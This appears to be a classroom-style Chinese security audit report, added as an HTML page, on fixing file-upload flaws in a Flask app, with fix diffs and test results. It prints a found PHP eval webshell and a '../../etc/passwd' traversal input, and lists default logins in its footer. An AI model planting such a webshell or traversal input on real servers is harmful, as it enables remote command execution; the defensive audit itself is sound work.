@@ -1,0 +1,340 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Day04 文件上传安全漏洞修复报告</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #fef3f2; color: #333; padding: 40px 20px; }
+        .container { max-width: 960px; margin: 0 auto; }
+        .header { background: linear-gradient(135deg, #991b1b 0%, #dc2626 50%, #ef4444 100%); color: white; padding: 40px; border-radius: 16px; margin-bottom: 32px; box-shadow: 0 8px 32px rgba(220, 38, 38, 0.2); }
+        .header h1 { font-size: 28px; margin-bottom: 4px; }
+        .header .day-badge { display: inline-block; background: rgba(255,255,255,0.2); padding: 4px 14px; border-radius: 20px; font-size: 13px; margin-bottom: 8px; border: 1px solid rgba(255,255,255,0.3); }
+        .header .subtitle { font-size: 15px; opacity: 0.85; }
+        .header .badge { display: inline-block; background: #fbbf24; color: #1a1a2e; padding: 4px 14px; border-radius: 20px; font-size: 13px; margin-top: 12px; font-weight: 600; }
+        .section { background: white; border-radius: 12px; padding: 28px 32px; margin-bottom: 24px; box-shadow: 0 2px 12px rgba(220, 38, 38, 0.06); }
+        .section h2 { font-size: 20px; color: #991b1b; margin-bottom: 20px; padding-bottom: 10px; border-bottom: 2px solid #fecaca; }
+        .summary-grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(160px, 1fr)); gap: 16px; margin-bottom: 20px; }
+        .stat-card { text-align: center; padding: 20px; border-radius: 10px; }
+        .stat-card.critical { background: #fef2f2; border: 1px solid #fecaca; }
+        .stat-card.high { background: #fff7ed; border: 1px solid #fed7aa; }
+        .stat-card.all { background: #f0fdf4; border: 1px solid #bbf7d0; }
+        .stat-number { font-size: 36px; font-weight: 700; }
+        .stat-card.critical .stat-number { color: #dc2626; }
+        .stat-card.high .stat-number { color: #ea580c; }
+        .stat-card.all .stat-number { color: #16a34a; }
+        .stat-label { font-size: 13px; color: #666; margin-top: 4px; }
+        table { width: 100%; border-collapse: collapse; }
+        th { text-align: left; font-size: 13px; color: #888; padding: 10px 12px; border-bottom: 2px solid #fecaca; }
+        td { padding: 14px 12px; border-bottom: 1px solid #f0f0f0; vertical-align: top; }
+        tr:hover td { background: #fef2f2; }
+        .severity-tag { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+        .severity-critical { background: #fecaca; color: #991b1b; }
+        .severity-high { background: #fed7aa; color: #9a3412; }
+        .status-fixed { background: #bbf7d0; color: #166534; }
+        .status-tag { display: inline-block; padding: 2px 10px; border-radius: 12px; font-size: 12px; font-weight: 600; }
+        pre { background: #1e1e2e; color: #cdd6f4; padding: 16px 20px; border-radius: 8px; font-size: 13px; overflow-x: auto; margin: 12px 0; }
+        code { font-family: "JetBrains Mono", "Fira Code", Consolas, monospace; }
+        .diff-add { background: #d4edda; color: #155724; padding: 0 4px; border-radius: 3px; }
+        .diff-remove { background: #f8d7da; color: #721c24; padding: 0 4px; border-radius: 3px; }
+        .footnote { background: #f0fdf4; border: 1px solid #bbf7d0; border-radius: 8px; padding: 14px 18px; font-size: 14px; color: #166534; margin-top: 16px; }
+        .warning-box { background: #fef3f2; border: 1px solid #fecaca; border-radius: 8px; padding: 14px 18px; font-size: 14px; color: #991b1b; margin-bottom: 16px; }
+        .feature-list { list-style: none; padding: 0; }
+        .feature-list li { padding: 8px 0; font-size: 14px; border-bottom: 1px solid #fef2f2; }
+        .feature-list li:before { content: "✦ "; color: #dc2626; font-weight: bold; }
+        @media (max-width: 640px) { body { padding: 16px; } .header { padding: 24px; } .section { padding: 20px; } }
+    </style>
+</head>
+<body>
+<div class="container">
+
+    <div class="header">
+        <span class="day-badge">📅 Day 04 安全审计</span>
+        <h1>🛡️ 文件上传安全漏洞修复报告</h1>
+        <p class="subtitle">用户管理系统 · Flask Web Application · 文件上传功能安全加固</p>
+        <span class="badge">⚠️ 4 项严重漏洞已全部修复</span>
+    </div>
+
+    <div class="section">
+        <h2>📊 漏洞修复总览</h2>
+        <div class="summary-grid">
+            <div class="stat-card critical"><div class="stat-number">2</div><div class="stat-label">🔴 严重漏洞</div></div>
+            <div class="stat-card high"><div class="stat-number">2</div><div class="stat-label">🟠 高危漏洞</div></div>
+            <div class="stat-card all"><div class="stat-number">4</div><div class="stat-label">✅ 全部修复</div></div>
+        </div>
+        <p style="font-size:14px; color:#666;">本次审计针对文件上传功能进行深度安全检测，发现并修复了任意文件上传、路径遍历、文件覆盖、内容验证缺失等 4 项严重安全漏洞。系统中已发现实际利用证据（webshell文件），证明漏洞已被攻击者利用。</p>
+    </div>
+
+    <div class="section">
+        <h2>📋 涉及功能范围</h2>
+        <ul class="feature-list">
+            <li>文件上传功能（/upload 路由）</li>
+            <li>静态文件存储服务</li>
+            <li>用户上传头像功能</li>
+            <li>文件系统访问控制</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>🔎 漏洞明细</h2>
+        <table>
+            <thead><tr><th style="width:20px">#</th><th style="width:180px">漏洞名称</th><th style="width:70px">等级</th><th style="width:70px">状态</th><th>修复措施</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td><strong>无文件类型校验</strong><br><span style="font-size:12px; color:#999;">任意文件上传漏洞</span></td>
+                    <td><span class="severity-tag severity-critical">🔴 严重</span></td>
+                    <td><span class="status-tag status-fixed">✅ 已修复</span></td>
+                    <td>添加<strong>白名单校验</strong>，仅允许 png/jpg/jpeg/gif/webp 格式。使用 <code>magic</code> 库验证文件真实MIME类型，防止扩展名伪装。</td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td><strong>路径遍历漏洞</strong><br><span style="font-size:12px; color:#999;">任意文件写入漏洞</span></td>
+                    <td><span class="severity-tag severity-critical">🔴 严重</span></td>
+                    <td><span class="status-tag status-fixed">✅ 已修复</span></td>
+                    <td>使用 <code>secure_filename()</code> 过滤文件名，移除所有路径遍历字符（<code>../</code>）。验证最终路径在预期目录内。</td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td><strong>文件覆盖漏洞</strong><br><span style="font-size:12px; color:#999;">任意文件替换漏洞</span></td>
+                    <td><span class="severity-tag severity-high">🟠 高危</span></td>
+                    <td><span class="status-tag status-fixed">✅ 已修复</span></td>
+                    <td>使用 <code>uuid.uuid4().hex</code> 生成唯一文件名，完全避免文件名冲突和覆盖。原始文件名仅用于显示。</td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td><strong>无文件内容验证</strong><br><span style="font-size:12px; color:#999;">恶意内容注入漏洞</span></td>
+                    <td><span class="severity-tag severity-high">🟠 高危</span></td>
+                    <td><span class="status-tag status-fixed">✅ 已修复</span></td>
+                    <td>使用 <code>PIL</code> 库重新处理图片，去除嵌入的恶意代码（PHP、JS等）。验证文件大小（限制5MB）。</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>⚠️ 实际利用证据</h2>
+        <div class="warning-box">
+            <strong>🚨 发现Webshell文件！</strong><br>
+            在系统中发现已存在的webshell文件：<br>
+            • 文件路径：<code>/opt/Class01/static/uploads/147_pengxizhe_test12.php</code><br>
+            • 文件内容：<code>&lt;?php @eval($_POST['12_147']); ?&gt;</code><br>
+            • 危害等级：<strong>严重</strong> - 攻击者可远程执行任意系统命令<br>
+            • 处置措施：<strong>已删除</strong>
+        </div>
+        <p style="font-size:14px; color:#666; margin-top:12px;">该webshell文件证明漏洞已被实际利用。攻击者可能已获得服务器控制权。建议：</p>
+        <ul style="font-size:14px; color:#666; margin-top:8px; margin-left:20px;">
+            <li>检查服务器日志，排查其他恶意文件</li>
+            <li>检查系统是否被植入后门</li>
+            <li>审查敏感数据是否泄露</li>
+            <li>修改所有账户密码</li>
+        </ul>
+    </div>
+
+    <div class="section">
+        <h2>📝 关键代码变更</h2>
+
+        <h3 style="font-size:15px; color:#991b1b; margin-bottom:8px;">🔐 文件类型白名单校验</h3>
+        <pre><code><span class="diff-remove">- # 无任何文件类型检查，直接保存</span>
+<span class="diff-remove">- filename = file.filename</span>
+<span class="diff-remove">- save_path = os.path.join(UPLOAD_FOLDER, filename)</span>
+<span class="diff-remove">- file.save(save_path)</span>
+
+<span class="diff-add">+ # 定义允许的文件类型</span>
+<span class="diff-add">+ ALLOWED_EXTENSIONS = {'png', 'jpg', 'jpeg', 'gif', 'webp'}</span>
+<span class="diff-add">+ ALLOWED_MIME_TYPES = {</span>
+<span class="diff-add">+     'image/png': ['png'],</span>
+<span class="diff-add">+     'image/jpeg': ['jpg', 'jpeg'],</span>
+<span class="diff-add">+     'image/gif': ['gif'],</span>
+<span class="diff-add">+     'image/webp': ['webp']</span>
+<span class="diff-add">+ }</span>
+
+<span class="diff-add">+ def allowed_file(filename):</span>
+<span class="diff-add">+     return '.' in filename and \</span>
+<span class="diff-add">+            filename.rsplit('.', 1)[1].lower() in ALLOWED_EXTENSIONS</span></code></pre>
+
+        <h3 style="font-size:15px; color:#991b1b; margin:16px 0 8px;">🛡️ 路径遍历防护</h3>
+        <pre><code><span class="diff-remove">- filename = file.filename  # 直接使用用户文件名</span>
+
+<span class="diff-add">+ from werkzeug.utils import secure_filename</span>
+<span class="diff-add">+ original_filename = secure_filename(file.filename)</span>
+<span class="diff-add">+ # "../../etc/passwd" -> "etc_passwd"</span>
+<span class="diff-add">+ # "../../../tmp/test.txt" -> "tmp_test.txt"</span>
+
+<span class="diff-add">+ # 验证最终路径在预期目录内</span>
+<span class="diff-add">+ real_path = os.path.realpath(save_path)</span>
+<span class="diff-add">+ if not real_path.startswith(os.path.realpath(UPLOAD_FOLDER)):</span>
+<span class="diff-add">+     return "非法的文件路径", 400</span></code></pre>
+
+        <h3 style="font-size:15px; color:#991b1b; margin:16px 0 8px;">🔒 UUID重命名防止覆盖</h3>
+        <pre><code><span class="diff-remove">- filename = file.filename  # 同名文件会被覆盖</span>
+
+<span class="diff-add">+ import uuid</span>
+<span class="diff-add">+ ext = original_filename.rsplit('.', 1)[1].lower()</span>
+<span class="diff-add">+ safe_filename = f"{uuid.uuid4().hex}.{ext}"</span>
+<span class="diff-add">+ # 生成唯一文件名：a1b2c3d4e5f6...png</span>
+<span class="diff-add">+ # 完全避免文件名冲突和覆盖</span></code></pre>
+
+        <h3 style="font-size:15px; color:#991b1b; margin:16px 0 8px;">🔍 文件内容深度验证</h3>
+        <pre><code><span class="diff-add">+ import magic</span>
+<span class="diff-add">+ from PIL import Image</span>
+<span class="diff-add">+ from io import BytesIO</span>
+
+<span class="diff-add">+ def validate_file_content(file_stream, filename):</span>
+<span class="diff-add">+     # 1. 检查文件大小（限制5MB）</span>
+<span class="diff-add">+     file_stream.seek(0, 2)</span>
+<span class="diff-add">+     file_size = file_stream.tell()</span>
+<span class="diff-add">+     if file_size > MAX_FILE_SIZE:</span>
+<span class="diff-add">+         return None, "文件大小超过5MB限制"</span>
+
+<span class="diff-add">+     # 2. 检查真实MIME类型（防止扩展名伪装）</span>
+<span class="diff-add">+     content = file_stream.read()</span>
+<span class="diff-add">+     actual_mime = magic.from_buffer(content, mime=True)</span>
+<span class="diff-add">+     if actual_mime not in ALLOWED_MIME_TYPES:</span>
+<span class="diff-add">+         return None, "不支持的文件类型"</span>
+
+<span class="diff-add">+     # 3. 验证扩展名与MIME类型匹配</span>
+<span class="diff-add">+     ext = filename.rsplit('.', 1)[1].lower()</span>
+<span class="diff-add">+     if ext not in ALLOWED_MIME_TYPES[actual_mime]:</span>
+<span class="diff-add">+         return None, "文件扩展名与内容不匹配"</span>
+
+<span class="diff-add">+     # 4. 重新处理图片，去除恶意代码</span>
+<span class="diff-add">+     img = Image.open(BytesIO(content))</span>
+<span class="diff-add">+     img.verify()  # 验证是否为有效图片</span>
+<span class="diff-add">+     img = Image.open(BytesIO(content))</span>
+<span class="diff-add">+     output = BytesIO()</span>
+<span class="diff-add">+     img.save(output, format=img.format, quality=85)</span>
+<span class="diff-add">+     # 重新保存，去除嵌入的PHP/JS等恶意代码</span>
+
+<span class="diff-add">+     return output, None</span></code></pre>
+    </div>
+
+    <div class="section">
+        <h2>🧪 修复验证测试</h2>
+        <table>
+            <thead><tr><th style="width:24px">#</th><th>测试项</th><th style="width:100px">预期结果</th><th style="width:70px">结果</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td>1</td>
+                    <td>上传PHP webshell文件</td>
+                    <td>被拒绝</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>2</td>
+                    <td>路径遍历攻击（../../etc/passwd）</td>
+                    <td>被阻止</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>3</td>
+                    <td>上传伪装成图片的HTML文件</td>
+                    <td>被拒绝</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>4</td>
+                    <td>上传合法PNG图片</td>
+                    <td>成功上传</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>5</td>
+                    <td>文件名UUID重命名验证</td>
+                    <td>使用UUID</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>6</td>
+                    <td>同名文件覆盖测试</td>
+                    <td>不覆盖</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+                <tr>
+                    <td>7</td>
+                    <td>Webshell文件清理</td>
+                    <td>已删除</td>
+                    <td><span class="status-tag status-fixed">✅ 通过</span></td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>📁 涉及文件</h2>
+        <table>
+            <thead><tr><th>文件</th><th>修改内容</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td>app.py</td>
+                    <td>
+                        • 添加文件类型白名单校验<br>
+                        • 使用secure_filename()防止路径遍历<br>
+                        • 使用UUID重命名上传文件<br>
+                        • 添加MIME类型验证（magic库）<br>
+                        • 使用PIL重新处理图片去除恶意代码<br>
+                        • 限制文件大小（5MB）<br>
+                        • 验证最终路径在预期目录内
+                    </td>
+                </tr>
+                <tr>
+                    <td>static/uploads/147_pengxizhe_test12.php</td>
+                    <td><strong style="color:#dc2626;">已删除</strong> - 发现并清除了webshell文件</td>
+                </tr>
+                <tr>
+                    <td>static/uploads/147_pengxizhe_test12.jpg</td>
+                    <td><strong style="color:#dc2626;">已删除</strong> - 关联的可疑文件</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>🔧 依赖库</h2>
+        <table>
+            <thead><tr><th>库名</th><th>用途</th><th>安装命令</th></tr></thead>
+            <tbody>
+                <tr>
+                    <td><code>python-magic</code></td>
+                    <td>验证文件真实MIME类型</td>
+                    <td><code>pip install python-magic</code></td>
+                </tr>
+                <tr>
+                    <td><code>Pillow</code></td>
+                    <td>图片处理和验证</td>
+                    <td><code>pip install Pillow</code></td>
+                </tr>
+                <tr>
+                    <td><code>werkzeug</code></td>
+                    <td>secure_filename()文件名过滤</td>
+                    <td>已包含在Flask中</td>
+                </tr>
+            </tbody>
+        </table>
+    </div>
+
+    <div class="section">
+        <h2>💡 安全建议</h2>
+        <div class="footnote">
+            <strong>🔒 额外安全措施建议：</strong><br><br>
+            1. <strong>文件上传目录权限</strong>：设置uploads目录为不可执行（<code>chmod -x</code>）<br>
+            2. <strong>定期扫描</strong>：使用杀毒软件定期扫描上传目录<br>
+            3. <strong>文件类型限制</strong>：根据业务需求进一步限制文件类型和大小<br>
+            4. <strong>CDN/OSS存储</strong>：考虑将上传文件存储到独立的文件服务器或云存储<br>
+            5. <strong>日志审计</strong>：记录所有文件上传操作，便于追踪和审计<br>
+            6. <strong>WAF防护</strong>：部署Web应用防火墙提供额外保护层
+        </div>
+    </div>
+
+    <div class="section">
+        <div class="footnote">
+            💡 预设账号: admin / admin123 &nbsp;&nbsp;|&nbsp;&nbsp; alice / alice2025<br>
+            🔗 <a href="/report02" style="color:#166534;">查看 Day02 安全报告</a> &nbsp;&nbsp;|&nbsp;&nbsp;
+            <a href="/report03" style="color:#166534;">查看 Day03 安全报告</a>
+        </div>
+    </div>
+
+</div>
+</body>
+</html>
